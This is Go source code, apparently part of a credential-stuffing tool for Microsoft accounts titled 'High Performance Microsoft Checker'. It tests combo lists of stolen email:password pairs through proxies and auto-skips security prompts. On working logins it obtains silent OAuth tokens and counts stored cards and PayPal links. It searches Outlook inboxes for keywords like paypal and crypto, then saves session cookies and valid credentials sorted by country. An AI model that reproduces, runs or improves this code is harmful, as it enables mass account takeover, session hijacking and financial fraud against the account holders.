		"pprid": {extractHidden(body, "pprid")},
		"uaid":  {extractHidden(body, "uaid")},
	}
	hdrs := map[string]string{"User-Agent": uaDesk, "Referer": "https://account.live.com/"}
	_, body2, err := doPost(client, fmhf, form, hdrs, 8*time.Second, false)
	if err != nil {
		return
	}
	action2 := extractAction(body2, "frmAddProof")
	if action2 == "" {
		action2 = extractAction(body2, "fmHF")
	}
	if action2 == "" {
		return
	}
	form2 := url.Values{
		"iProofOptions": {"Email"}, "DisplayPhoneCountryISO": {"US"},
		"DisplayPhoneNumber": {""}, "EmailAddress": {""},
		"canary": {extractHidden(body2, "canary")},
		"action": {"Skip"}, "PhoneNumber": {""}, "PhoneCountryISO": {""},
	}
	doPost(client, action2, form2, hdrs, 8*time.Second, false)
}

func bypassPrivacy(client *http.Client, body string) {
	priv := extractAction(body, "fmHF")
	if priv == "" {
		priv = extractAction(body, "privacyForm")
	}
	if priv == "" {
		return
	}
	cod := extractHidden(body, "code")
	if cod == "" {
		cod = extractHidden(body, "state")
	}
	form := url.Values{
		"correlation_id": {extractHidden(body, "correlation_id")},
		"code":           {cod},
		"client_info":    {extractHidden(body, "client_info")},
		"action":         {"accept"},
	}
	hdrs := map[string]string{
		"User-Agent": uaDesk,
		"Origin":     "https://login.live.com",
		"Referer":    "https://login.live.com/",
	}
	doPost(client, priv, form, hdrs, 8*time.Second, false)
}

func bypassUpdate(client *http.Client, body string) bool {
	action := extractAction(body, "fmHF")
	if action == "" {
		action = extractAction(body, "updateForm")
	}
	if action == "" {
		return false
	}
	form := url.Values{
		"action": {"Skip"},
		"canary": {extractHidden(body, "canary")},
		"pprid":  {extractHidden(body, "pprid")},
		"uaid":   {extractHidden(body, "uaid")},
		"ipt":    {extractHidden(body, "ipt")},
	}
	hdrs := map[string]string{"User-Agent": uaDesk}
	resp, _, err := doPost(client, action, form, hdrs, 8*time.Second, false)
	return err == nil && resp.StatusCode == 200
}

// ─── Silent Token ─────────────────────────────────────────────────────

func silentToken(client *http.Client, clientID, scope, redirectURI string, timeout time.Duration) string {
	params := url.Values{
		"client_id":     {clientID},
		"response_type": {"token"},
		"scope":         {scope},
		"redirect_uri":  {redirectURI},
		"prompt":        {"none"},
	}
	reqURL := "https://login.live.com/oauth20_authorize.srf?" + params.Encode()
	hdrs := map[string]string{"User-Agent": uaDesk, "Accept": "*/*"}
	resp, _, err := doGet(client, reqURL, hdrs, timeout)
	if err != nil {
		return ""
	}
	// Check final URL fragment
	if resp.Request != nil {
		finalURL := resp.Request.URL.String()
		if tok := extractParam(finalURL+"#"+resp.Header.Get("Location"), "access_token"); tok != "" {
			return tok
		}
	}
	loc := resp.Header.Get("Location")
	return extractParam(loc, "access_token")
}

func extractParam(rawURL, param string) string {
	for _, sep := range []string{"?", "#", "&"} {
		_ = sep
	}
	// Try as URL fragment and query
	for _, part := range strings.Split(rawURL, "#") {
		vals, err := url.ParseQuery(part)
		if err == nil {
			if v := vals.Get(param); v != "" {
				return v
			}
		}
	}
	// Fallback: manual split
	marker := param + "="
	if idx := strings.Index(rawURL, marker); idx >= 0 {
		rest := rawURL[idx+len(marker):]
		end := strings.IndexAny(rest, "&# ")
		if end < 0 {
			return rest
		}
		return rest[:end]
	}
	return ""
}

// ─── String Helpers ───────────────────────────────────────────────────

func containsAny(s string, subs []string) bool {
	for _, sub := range subs {
		if strings.Contains(s, sub) {
			return true
		}
	}
	return false
}

func between(s, start, end string) string {
	si := strings.Index(s, start)
	if si < 0 {
		return ""
	}
	s = s[si+len(start):]
	ei := strings.Index(s, end)
	if ei < 0 {
		return s
	}
	return s[:ei]
}

// ─── JWT Decode ───────────────────────────────────────────────────────

func decodeJWT(token string) map[string]interface{} {
	parts := strings.Split(token, ".")
	if len(parts) < 2 {
		return nil
	}
	pad := parts[1]
	switch len(pad) % 4 {
	case 2:
		pad += "=="
	case 3:
		pad += "="
	}
	data, err := base64.URLEncoding.DecodeString(pad)
	if err != nil {
		data, err = base64.RawURLEncoding.DecodeString(parts[1])
		if err != nil {
			return nil
		}
	}
	var out map[string]interface{}
	json.Unmarshal(data, &out)
	return out
}

// ─── Rewards Checker ──────────────────────────────────────────────────

func checkRewards(client *http.Client) int {
	hdr := map[string]string{"User-Agent": uaDesk, "Pragma": "no-cache", "Accept": "*/*"}
	_, body, err := doGet(client, "https://rewards.bing.com/", hdr, tReward)
	if err == nil {
		if strings.Contains(body, `action="https://rewards.bing.com/signin-oidc"`) || strings.Contains(body, `id="fmHF"`) {
			re := regexp.MustCompile(`action="([^"]+)"`)
			if m := re.FindStringSubmatch(body); len(m) > 1 {
				inputs := regexp.MustCompile(`<input type="hidden" name="([^"]+)" id="[^"]+" value="([^"]+)">`).FindAllStringSubmatch(body, -1)
				form := url.Values{}
				for _, inp := range inputs {
					form.Set(inp[1], inp[2])
				}
				_, body2, _ := doPost(client, m[1], form, hdr, tReward, false)
				if body2 != "" {
					body = body2
				}
			}
		}
		re2 := regexp.MustCompile(`,\"availablePoints\":(\d+)`)
		matches := re2.FindAllStringSubmatch(body, -1)
		best := 0
		for _, m := range matches {
			if v, _ := strconv.Atoi(m[1]); v > best {
				best = v
			}
		}
		if best > 0 {
			return best
		}
	}
	// Flyout fallback
	doGet(client, "https://www.bing.com/", map[string]string{"User-Agent": uaDesk}, 5*time.Second)
	ts := time.Now().UnixMilli()
	flyURL := fmt.Sprintf("https://www.bing.com/rewards/panelflyout/getuserinfo?timestamp=%d", ts)
	flyHdr := map[string]string{
		"User-Agent": uaDesk, "Accept": "application/json",
		"Accept-Encoding": "identity", "Referer": "https://www.bing.com/",
		"X-Requested-With": "XMLHttpRequest",
	}
	_, flyBody, err2 := doGet(client, flyURL, flyHdr, 7*time.Second)
	if err2 == nil {
		var d map[string]interface{}
		if json.Unmarshal([]byte(flyBody), &d) == nil {
			if ui, ok := d["userInfo"].(map[string]interface{}); ok {
				if ui["isRewardsUser"] == true {
					if bal, ok := ui["balance"].(float64); ok {
						return int(bal)
					}
				}
			}
		}
	}
	return 0
}

// ─── Profile from JWT Cookie ──────────────────────────────────────────

type profile struct {
	Name    string
	Country string
}

func getProfile(client *http.Client) profile {
	// Warm account.microsoft.com
	doGet(client, "https://account.microsoft.com/", map[string]string{"User-Agent": uaDesk}, tCookie)
	jwt := getCookie(client, "AMCSecAuthJWT")
	if jwt != "" {
		p := decodeJWT(jwt)
		if p != nil {
			name, _ := p["name"].(string)
			ctry, _ := p["ctry"].(string)
			if name == "" {
				fn, _ := p["given_name"].(string)
				ln, _ := p["family_name"].(string)
				name = strings.TrimSpace(fn + " " + ln)
			}
			return profile{Name: name, Country: ctry}
		}
	}
	// JSHP fallback
	jshp := getCookie(client, "JSHP")
	if jshp != "" {
		parts := strings.Split(jshp, "$")
		if len(parts) >= 4 {
			fn := strings.TrimSpace(parts[2])
			ln := strings.TrimSpace(parts[3])
			return profile{Name: strings.TrimSpace(fn + " " + ln)}
		}
	}
	return profile{}
}

// ─── Payment Checker ──────────────────────────────────────────────────

func checkPayment(client *http.Client) (cards, paypals int) {
	tok := silentToken(client, "000000000004773A",
		"PIFD.Read PIFD.Create PIFD.Update PIFD.Delete",
		"https://account.microsoft.com/auth/complete-silent-delegate-auth", tPayment)
	if tok != "" {
		hdrs := map[string]string{
			"Authorization": "MSADELEGATE1.0=" + tok,
			"Accept":        "application/json",
			"User-Agent":    uaDesk,
		}
		_, body, err := doGet(client,
			"https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active&language=en-GB",
			hdrs, tPayment)
		if err == nil {
			var items []map[string]interface{}
			if json.Unmarshal([]byte(body), &items) == nil {
				seen := map[string]bool{}
				for _, item := range items {
					iid, _ := item["paymentInstrumentId"].(string)
					if iid == "" {
						iid, _ = item["id"].(string)
					}
					if seen[iid] {
						continue
					}
					seen[iid] = true
					pm, _ := item["paymentMethod"].(map[string]interface{})
					if pm == nil {
						pm = item
					}
					fam, _ := pm["paymentMethodFamily"].(string)
					fam = strings.ToLower(fam)
					switch fam {
					case "credit_card", "debit_card", "card":
						cards++
					case "paypal":
						paypals++
					}
				}
				return
			}
		}
	}
	// Billing page fallback
	doGet(client, "https://account.microsoft.com/", map[string]string{"User-Agent": uaDesk}, tCookie)
	_, body2, err := doGet(client,
		"https://account.microsoft.com/billing/payments",
		map[string]string{"User-Agent": uaDesk, "Accept": "text/html,*/*"}, tPayment)
	if err == nil {
		re := regexp.MustCompile(`"paymentMethodFamily"\s*:\s*"([^"]+)"`)
		for _, m := range re.FindAllStringSubmatch(body2, -1) {
			switch strings.ToLower(m[1]) {
			case "credit_card", "debit_card":
				cards++
			case "paypal":
				paypals++
			}
		}
	}
	return
}

func fmtPayment(cards, paypals int) string {
	var parts []string
	if cards > 0 {
		s := "card"
		if cards > 1 {
			s = "cards"
		}
		parts = append(parts, fmt.Sprintf("(%d) active %s", cards, s))
	}
	if paypals > 0 {
		parts = append(parts, fmt.Sprintf("(%d) PayPal", paypals))
	}
	if len(parts) == 0 {
		return ""
	}
	return "[" + strings.Join(parts, ", ") + "]"
}

// ─── Inbox Checker ────────────────────────────────────────────────────

func checkInbox(client *http.Client, email string, keywords []string, domainFilters []string) map[string]int {
	if len(keywords) == 0 {
		return nil
	}
	doGet(client, "https://outlook.live.com/owa/",
		map[string]string{"User-Agent": uaDesk, "Accept": "*/*"}, 7*time.Second)
	cid := getCookie(client, "MSPCID")
	if cid == "" {
		cid = strings.ToUpper(email)
	}
	var tok string
	for _, scope := range []string{
		"https://substrate.office.com/User-Internal.ReadWrite",
		"service::outlook.office.com::MBI_SSL",
	} {
		tok = silentToken(client, "0000000048170EF2", scope,
			"https://login.live.com/oauth20_desktop.srf", tInbox)
		if tok != "" {
			break
		}
	}
	if tok == "" {
		return nil
	}
	hdrs := map[string]string{
		"Authorization":    "Bearer " + tok,
		"X-AnchorMailbox": "CID:" + cid,
		"Content-Type":    "application/json",
		"User-Agent":      "Outlook-Android/2.0",
		"Accept":          "application/json",
		"Host":            "substrate.office.com",
	}
	// Merge keywords + domain filters into one search list
	allQueries := make([]string, 0, len(keywords)+len(domainFilters))
	allQueries = append(allQueries, keywords...)
	for _, d := range domainFilters {
		// Strip leading '@' — Outlook search expects 'from:domain.ca', not 'from:@domain.ca'
		domainQ := "from:" + strings.TrimPrefix(d, "@")
		allQueries = append(allQueries, domainQ)
	}

	results := map[string]int{}
	for _, kw := range allQueries {
		payload := map[string]interface{}{
			"Cvid":            randUUID(),
			"Scenario":        map[string]string{"Name": "owa.react"},
			"TimeZone":        "UTC",
			"TextDecorations": "Off",
			"EntityRequests": []map[string]interface{}{{
				"EntityType":     "Conversation",
				"ContentSources": []string{"Exchange"},
				"Filter": map[string]interface{}{"Or": []map[string]interface{}{
					{"Term": map[string]string{"DistinguishedFolderName": "msgfolderroot"}},
					{"Term": map[string]string{"DistinguishedFolderName": "DeletedItems"}},
				}},
				"From":              0,
				"Query":             map[string]string{"QueryString": kw},
				"RefiningQueries":   nil,
				"Size":              25,
				"EnableTopResults":  true,
				"TopResultsCount":   3,
			}},
			"AnswerEntityRequests":   []interface{}{},
			"QueryAlterationOptions": map[string]bool{"EnableSuggestion": true, "EnableAlteration": true},
			"LogicalId":              randUUID(),
		}
		_, body, err := doPostJSON(client,
			"https://outlook.live.com/search/api/v2/query?n=124",
			payload, hdrs, tInbox)
		if err != nil {
			continue
		}
		var resp map[string]interface{}
		found := 0
		if json.Unmarshal([]byte(body), &resp) == nil {
			if es, ok := resp["EntitySets"].([]interface{}); ok {
				for _, e := range es {
					em, _ := e.(map[string]interface{})
					if rs, ok := em["ResultSets"].([]interface{}); ok {
						for _, r := range rs {
							rm, _ := r.(map[string]interface{})
							if t, ok := rm["Total"].(float64); ok {
								found += int(t)
							} else if rc, ok := rm["ResultCount"].(float64); ok {
								found += int(rc)
							} else if res, ok := rm["Results"].([]interface{}); ok {
								found += len(res)
							}
						}
					}
				}
			}
		}
		if found > 0 {
			results[kw] = found
		}
	}
	return results
}

// ─── Cookie Save System ───────────────────────────────────────────────

var (
	skipCookies  = map[string]bool{"MSPAuth": true, "MSPProf": true, "MSPSoftVis": true, "MSPBack": true}
	msSecDomains = []string{".live.com", ".login.live.com", ".account.live.com", ".account.microsoft.com", ".login.microsoftonline.com", ".outlook.live.com"}
	cookieURLs   = []string{
		"https://login.live.com/", "https://account.live.com/",
		"https://account.microsoft.com/", "https://outlook.live.com/mail/",
		"https://www.bing.com/", "https://www.xbox.com/",
	}
)

func warmCookieURLs(client *http.Client) {
	for _, u := range cookieURLs {
		doGet(client, u, map[string]string{"User-Agent": uaDesk}, tCookie)
	}
}

func buildCookieJSON(client *http.Client) string {
	warmCookieURLs(client)
	cookies := allCookies(client)
	type cookieJSON struct {
		Domain         string  `json:"domain,omitempty"`
		ExpirationDate float64 `json:"expirationDate"`
		HostOnly       bool    `json:"hostOnly"`
		HttpOnly       bool    `json:"httpOnly"`
		Name           string  `json:"name"`
		Path           string  `json:"path"`
		SameSite       string  `json:"sameSite"`
		Secure         bool    `json:"secure"`
		Session        bool    `json:"session"`
		StoreId        *string `json:"storeId"`
		Value          string  `json:"value"`
	}
	var result []cookieJSON
	seen := map[string]bool{}
	for _, c := range cookies {
		if skipCookies[c.Name] || c.Value == "" {
			continue
		}
		key := c.Domain + "|" + c.Name
		if seen[key] {
			continue
		}
		seen[key] = true
		expInt := float64(2147483647)
		isSession := false
		if !c.Expires.IsZero() {
			expInt = float64(c.Expires.Unix())
			isSession = expInt <= 0
			if expInt <= 0 {
				expInt = 2147483647
			}
		}
		dom := c.Domain
		if dom != "" && !strings.HasPrefix(dom, ".") && strings.Count(dom, ".") >= 1 {
			dom = "." + dom
		}
		if dom == "" {
			dom = ".microsoft.com"
		}
		isSecure := c.Secure
		domLower := strings.ToLower(dom)
		for _, sd := range msSecDomains {
			if strings.HasSuffix(domLower, sd) {
				isSecure = true
				break
			}
		}
		path := c.Path
		if path == "" {
			path = "/"
		}
		cj := cookieJSON{
			ExpirationDate: expInt,
			HostOnly:       !strings.HasPrefix(dom, "."),
			HttpOnly:       c.HttpOnly,
			Name:           c.Name,
			Path:           path,
			SameSite:       "no_restriction",
			Secure:         isSecure,
			Session:        isSession,
			StoreId:        nil,
			Value:          c.Value,
		}
		if !strings.HasPrefix(c.Name, "__Host-") {
			cj.Domain = dom
		}
		result = append(result, cj)
	}
	data, _ := json.MarshalIndent(result, "", "  ")
	return string(data)
}

func saveCookies(email string, client *http.Client) {
	safe := regexp.MustCompile(`[\\/:*?"<>|]`).ReplaceAllString(email, "_")
	jsonData := buildCookieJSON(client)
	os.MkdirAll(cookiesDir, 0755)
	fpath := filepath.Join(cookiesDir, safe+".txt")
	_ = os.WriteFile(fpath, []byte(jsonData), 0644)
}

func zipCookies() {
	files, err := os.ReadDir(cookiesDir)
	if err != nil || len(files) == 0 {
		return
	}

	f, err := os.Create(cookiesZip)
	if err != nil {
		return
	}
	defer f.Close()

	zw := zip.NewWriter(f)
	defer zw.Close()

	for _, file := range files {
		if file.IsDir() {
			continue
		}
		fpath := filepath.Join(cookiesDir, file.Name())
		data, err := os.ReadFile(fpath)
		if err != nil {
			continue
		}

		w, err := zw.Create(file.Name())
		if err == nil {
			_, _ = w.Write(data)
		}
	}

	_ = os.RemoveAll(cookiesDir)
}

// ─── Country Sorter ───────────────────────────────────────────────────
// Uses in-memory seen-set per country file to avoid reading files on every hit

var (
	countryLock sync.Mutex
	countrySeen = map[string]map[string]bool{} // country -> set of emails
)

func saveCountry(email, password, country string) {
	if country == "" {
		country = "UNKNOWN"
	}
	country = regexp.MustCompile(`[^A-Z0-9_]`).ReplaceAllString(strings.ToUpper(strings.TrimSpace(country)), "_")
	fname := filepath.Join(countryDir, country+".txt")
	line := email + ":" + password
	emailLower := strings.ToLower(email)
	countryLock.Lock()
	defer countryLock.Unlock()
	if _, ok := countrySeen[country]; !ok {
		countrySeen[country] = map[string]bool{}
	}
	if countrySeen[country][emailLower] {
		return
	}
	countrySeen[country][emailLower] = true
	f, err := os.OpenFile(fname, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		fmt.Fprintln(f, line)
		f.Close()
	}
}

// ─── Dedup File Writer ────────────────────────────────────────────────

var fileLock sync.Mutex

func writeDedup(fpath, content string) {
	fileLock.Lock()
	defer fileLock.Unlock()
	existing, _ := os.ReadFile(fpath)
	firstLine := strings.SplitN(content, "\n", 2)[0]
	if strings.Contains(string(existing), firstLine) {
		return
	}
	f, err := os.OpenFile(fpath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	f.WriteString(content)
}

func appendLine(fpath, line string) {
	fileLock.Lock()
	defer fileLock.Unlock()
	f, _ := os.OpenFile(fpath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if f != nil {
		fmt.Fprintln(f, line)
		f.Close()
	}
}

// ─── Inbox Directory Writer ───────────────────────────────────────────

var inboxLock sync.Mutex

func saveInbox(email, password string, hits map[string]int) {
	if len(hits) == 0 {
		return
	}
	os.MkdirAll(inboxDir, 0755)
	domainsDir := filepath.Join(inboxDir, "domains")
	var matched []string
	for kw := range hits {
		matched = append(matched, kw)
	}
	line := email + ":" + password + " (" + strings.Join(matched, ", ") + ")"
	inboxLock.Lock()
	defer inboxLock.Unlock()
	for _, kw := range matched {
		var fname string
		if strings.HasPrefix(kw, "from:") {
			// Domain filter hit — save to domains/ subfolder with clean domain name
			os.MkdirAll(domainsDir, 0755)
			domainName := strings.TrimPrefix(kw, "from:")
			safe := regexp.MustCompile(`[^a-zA-Z0-9_\.\-]`).ReplaceAllString(domainName, "_")
			fname = filepath.Join(domainsDir, safe+".txt")
		} else {
			// Keyword hit — save to inbox root
			safe := regexp.MustCompile(`[^a-zA-Z0-9_\- ]`).ReplaceAllString(kw, "")
			fname = filepath.Join(inboxDir, safe+".txt")
		}
		existing, _ := os.ReadFile(fname)
		if !strings.Contains(string(existing), email) {
			f, _ := os.OpenFile(fname, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if f != nil {
				fmt.Fprintln(f, line)
				f.Close()
			}
		}
	}
}

// ─── Per-Account Processor ────────────────────────────────────────────

func processAccount(email, password string, proxies []string, keywords []string, domainFilters []string, configs []loginCfg, retries int) {
	// Panic recovery — one bad account must never kill the whole worker
	defer func() {
		if r := recover(); r != nil {
			incrBad()
			incrChecked()
		}
	}()
	// Retry loop: on transient rate-limit (lrRotate), retry up to retries times
	var lr loginResult
	var hr *hitResult
	for attempt := 0; attempt <= retries; attempt++ {
		lr, hr = doLogin(email, password, proxies, configs)
		if lr != lrRotate {
			break // definitive result (hit / bad / 2fa)
		}
		if attempt < retries {
			time.Sleep(200 * time.Millisecond) // minimal backoff — don't stall workers
		}
	}
	// If still rotating after all retries, count as bad (unresolvable)
	if lr == lrRotate {
		lr = lrBad
	}
	incrChecked()
	updateTitle()

	now := time.Now().Format("15:04:05")

	if lr == lrBad {
		incrBad()
		printLock.Lock()
		fmt.Printf("[%s] [%sBAD%s] %s\n", now, cRed, cReset, email)
		printLock.Unlock()
		return
	}

	if lr == lrTwoFA {
		incr2FA()
		printLock.Lock()
		fmt.Printf("[%s] [%s2FA%s] %s\n", now, cYellow, cReset, email)
		printLock.Unlock()
		appendLine(twofaFile, email+":"+password)
		return
	}

	if lr == lrHit && hr != nil {
		incrHits()

		// 1. Rewards
		pts := checkRewards(hr.client)

		// 2. Profile
		prof := getProfile(hr.client)

		// 3. Payment Methods
		cards, paypals := checkPayment(hr.client)
		payStr := fmtPayment(cards, paypals)

		// 4. Inbox Search
		inboxHits := checkInbox(hr.client, email, keywords, domainFilters)

		// Build formatted captures
		var capParts []string
		if prof.Name != "" {
			capParts = append(capParts, "Name: "+prof.Name)
		}
		if prof.Country != "" {
			capParts = append(capParts, "Country: "+prof.Country)
		}
		if pts > 0 {
			capParts = append(capParts, fmt.Sprintf("Rewards: %d pts", pts))
		}
		if payStr != "" {
			capParts = append(capParts, "Payment: "+payStr)
		}
		if len(inboxHits) > 0 {
			var kws []string
			for kw, count := range inboxHits {
				kws = append(kws, fmt.Sprintf("%s (%d)", kw, count))
			}
			capParts = append(capParts, "Inbox: ["+strings.Join(kws, ", ")+"]")
		}

		capStr := ""
		if len(capParts) > 0 {
			capStr = " | " + strings.Join(capParts, " | ")
		}

		// Save Hit
		hitLine := fmt.Sprintf("%s:%s\n", email, password)
		writeDedup(msFile, hitLine)

		// Specific logs
		if pts > 0 {
			writeDedup(ptsFile, fmt.Sprintf("%s:%s | %d pts\n", email, password, pts))
		}
		if cards > 0 || paypals > 0 {
			writeDedup(payFile, fmt.Sprintf("%s:%s | %s\n", email, password, payStr))
		}

		// Inbox save
		if len(inboxHits) > 0 {
			saveInbox(email, password, inboxHits)
		}

		// Save Cookies
		saveCookies(email, hr.client)

		// Country sort
		saveCountry(email, password, prof.Country)

		// Print glowing hit
		printLock.Lock()
		ctryPart := ""
		if prof.Country != "" {
			ctryPart = fmt.Sprintf("[%s%s%s] ", cCyan, prof.Country, cReset)
		}
		fmt.Printf("[%s] [%sHIT%s] %s%s%s\n", now, cBGreen, cReset, ctryPart, email, capStr)
		printLock.Unlock()
	}
}

// ─── Main Orchestrator ────────────────────────────────────────────────

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU()) // use all CPU cores for max throughput
	startTime = time.Now()

	// ASCII banner
	banner := fmt.Sprintf(`%s
███╗   ███╗███████╗ ██████╗ ██╗    ██╗███╗   ███╗███████╗
████╗ ████║██╔════╝██╔═══██╗██║    ██║████╗ ████║██╔════╝
██╔████╔██║█████╗  ██║   ██║██║ █╗ ██║██╔████╔██║███████╗
██║╚██╔╝██║██╔══╝  ██║   ██║██║███╗██║██║╚██╔╝██║╚════██║
██║ ╚═╝ ██║███████╗╚██████╔╝╚███╔███╔╝██║ ╚═╝ ██║███████║
╚═╝     ╚═╝╚══════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝     ╚═╝╚══════╝%s
             %sHigh Performance Microsoft Checker%s
             %sCreated by Rivansoul & MeowMal Team%s
`, cBCyan, cReset, cBYellow, cReset, cWhite, cReset)

	fmt.Print(banner)

	// Create directories
	os.MkdirAll(resultDir, 0755)
	os.MkdirAll(countryDir, 0755)

	// 1. Load accounts
	var accounts [][2]string
	fAcc, err := os.Open(accFile)
	if err != nil {
		fmt.Printf("[%s!%s] File '%s' not found. Please create it and add combos.\n", cRed, cReset, accFile)
		return
	}
	defer fAcc.Close()

	seenAccs := map[string]bool{}
	scanner := bufio.NewScanner(fAcc)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		var parts []string
		if strings.Contains(line, ":") {
			parts = strings.SplitN(line, ":", 2)
		} else if strings.Contains(line, ";") {
			parts = strings.SplitN(line, ";", 2)
		}
		if len(parts) == 2 {
			email := strings.TrimSpace(parts[0])
			pass := strings.TrimSpace(parts[1])
			if email != "" && pass != "" && !seenAccs[strings.ToLower(email)] {
				seenAccs[strings.ToLower(email)] = true
				accounts = append(accounts, [2]string{email, pass})
			}
		}
	}
	if err := scanner.Err(); err != nil {
		fmt.Printf("[%s!%s] Error reading accounts: %v\n", cRed, cReset, err)
	}

	totalAccs := len(accounts)
	if totalAccs == 0 {
		fmt.Printf("[%s!%s] No accounts loaded from '%s'.\n", cRed, cReset, accFile)
		return
	}
	statTotal = int64(totalAccs)
	fmt.Printf("[%s*%s] Loaded %s%d%s unique accounts.\n", cCyan, cReset, cBold, totalAccs, cReset)

	// 2. Load proxies
	var proxies []string
	fPrx, err := os.Open(proxyFile)
	if err == nil {
		prxScanner := bufio.NewScanner(fPrx)
		for prxScanner.Scan() {
			line := normProxy(prxScanner.Text())
			if line != "" {
				proxies = append(proxies, line)
			}
		}
		if err := prxScanner.Err(); err != nil {
			fmt.Printf("[%s!%s] Error reading proxies: %v\n", cRed, cReset, err)
		}
		fPrx.Close()
	}
	if len(proxies) == 0 {
		fmt.Printf("[%s*%s] Running in proxyless mode (no proxies loaded).\n", cYellow, cReset)
	} else {
		fmt.Printf("[%s*%s] Loaded %s%d%s proxies.\n", cCyan, cReset, cBold, len(proxies), cReset)
	}

	// 3. Load search keywords
	var keywords []string
	fInb, err := os.Open(inboxFile)
	if err == nil {
		inbScanner := bufio.NewScanner(fInb)
		for inbScanner.Scan() {
			kw := strings.TrimSpace(inbScanner.Text())
			if kw != "" {
				keywords = append(keywords, kw)
			}
		}
		if err := inbScanner.Err(); err != nil {
			fmt.Printf("[%s!%s] Error reading keywords: %v\n", cRed, cReset, err)
		}
		fInb.Close()
	}
	if len(keywords) == 0 {
		// Default common keywords fallback
		keywords = []string{"epicgames", "steam", "playstation", "roblox", "minecraft", "paypal", "crypto"}
		fmt.Printf("[%s*%s] No keywords loaded. Using common defaults.\n", cYellow, cReset)
	} else {
		fmt.Printf("[%s*%s] Loaded %s%d%s search keywords.\n", cCyan, cReset, cBold, len(keywords), cReset)
	}

	// Pre-generate configs
	configs := buildConfigs()

	// ── Load config.ini ──────────────────────────────────────────────
	cfg := parseINI("config.ini")

	// Thread count (default 150 for 1k+ CPM; scale with proxy count)
	numWorkers := cfg.getInt("checker", "threads", 150)
	if numWorkers < 1 {
		numWorkers = 150
	}
	if totalAccs < numWorkers {
		numWorkers = totalAccs
	}

	// Retry count
	numRetries := cfg.getInt("checker", "retries", 2)
	if numRetries < 0 {
		numRetries = 0
	}

	// Domain filters from config.ini [inbox] domain_filter
	var domainFilters []string
	if df := cfg.get("inbox", "domain_filter", ""); df != "" {
		for _, d := range strings.Split(df, ",") {
			d = strings.TrimSpace(d)
			if d != "" {
				domainFilters = append(domainFilters, d)
			}
		}
	}

	// Keywords: ALWAYS prefer config.ini [inbox] keywords; inbox.txt is secondary
	if ck := cfg.get("inbox", "keywords", ""); ck != "" {
		keywords = nil // reset; config takes priority
		for _, k := range strings.Split(ck, ",") {
			k = strings.TrimSpace(k)
			if k != "" {
				keywords = append(keywords, k)
			}
		}
		fmt.Printf("[%s*%s] Keywords loaded from config.ini: %s%d%s keywords.\n", cCyan, cReset, cBold, len(keywords), cReset)
	}

	if len(domainFilters) > 0 {
		fmt.Printf("[%s*%s] Domain filters: %s%d%s domains loaded.\n", cCyan, cReset, cBold, len(domainFilters), cReset)
	}

	// Lines-per-agent split info
	linesPerAgent := 1000
	if numWorkers > 0 {
		linesPerAgent = totalAccs / numWorkers
		if linesPerAgent < 1 {
			linesPerAgent = 1
		}
	}

	fmt.Printf("[%s*%s] Starting checker with %s%d%s workers | ~%s%d%s lines/agent | Retries: %s%d%s\n\n",
		cCyan, cReset, cBold, numWorkers, cReset, cBold, linesPerAgent, cReset, cBold, numRetries, cReset)
	updateTitle()

	jobs := make(chan [2]string, totalAccs)
	for _, acc := range accounts {
		jobs <- acc
	}
	close(jobs)

	var wg sync.WaitGroup
	for w := 1; w <= numWorkers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer func() { // goroutine-level crash guard
				if r := recover(); r != nil {
					// drain remaining jobs so wg doesn't hang
					for range jobs {
						incrBad()
						incrChecked()
					}
				}
			}()
			for acc := range jobs {
				processAccount(acc[0], acc[1], proxies, keywords, domainFilters, configs, numRetries)
			}
		}()
	}

	// Stats logger in background — keeps title updated without polluting the console log
	stopStats := make(chan struct{})
	go func() {
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				printLock.Lock()
				updateTitle()
				printLock.Unlock()
			case <-stopStats:
				return
			}
		}
	}()

	wg.Wait()
	close(stopStats)

	zipCookies()

	// Summary
	totalTime := elapsed()
	h := atomic.LoadInt64(&statHits)
	b := atomic.LoadInt64(&statBad)
	bl := atomic.LoadInt64(&statBlocked)

	tfa := atomic.LoadInt64(&stat2FA)

	fmt.Printf("\n%s══════════════ Check Completed ══════════════%s\n", cBCyan, cReset)
	fmt.Printf(" Time Elapsed : %s\n", totalTime)
	fmt.Printf(" Checked      : %d / %d\n", statChecked, totalAccs)
	fmt.Printf(" CPM (avg)    : %d\n", getCPM())
	fmt.Printf(" Hits         : %s%d%s\n", cBGreen, h, cReset)
	fmt.Printf(" Bad          : %s%d%s\n", cRed, b, cReset)
	fmt.Printf(" 2FA          : %s%d%s\n", cYellow, tfa, cReset)
	fmt.Printf(" Blocked      : %s%d%s\n", cYellow, bl, cReset)
	fmt.Printf("%s═════════════════════════════════════════════%s\n", cBCyan, cReset)
}
